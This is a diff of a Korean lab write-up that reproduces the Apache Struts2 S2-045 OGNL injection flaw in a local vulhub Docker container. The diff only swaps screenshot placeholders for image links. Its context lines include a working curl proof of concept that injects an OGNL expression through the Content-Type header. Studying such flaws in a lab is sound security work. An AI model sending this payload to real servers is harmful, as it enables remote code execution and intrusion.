@@ -16,7 +16,7 @@ cd vulhub/struts2/s2-045
 docker compose up -d
 컨테이너가 정상적으로 구동되었고, localhost:8080로 접근할 수 있었다.
 
-(여기에 [컨테이너 띄운 캡처] 삽입 예정)
+![컨테이너 띄운 화면](compose.png)
 
 3.2. 환경 구축 결과
 컨테이너가 정상적으로 올라가면서 Struts2 쇼케이스 페이지가 동작하는 것을 확인했다.
@@ -27,7 +27,7 @@ curl 명령어를 이용해 Content-Type 헤더에 OGNL 표현식을 삽입해 �
 
 curl -v -H "Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ctn=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']).(#ctn.getWriter().println('vulnerable')).(#ctn.getWriter().flush())}" http://localhost:8080/struts2-showcase/upload.action
 
-(여기에 [PoC 성공 캡처] 삽입 예정)
+![PoC 성공 화면](curl.png)
 
 4.2. 결과 확인
 응답 본문에 vulnerable이라는 문자열이 출력되면서, 서버에서 OGNL 표현식이 실제로 실행된 것을 확인했다. 이를 통해 취약점이 존재함을 직접 검증할 수 있었다.
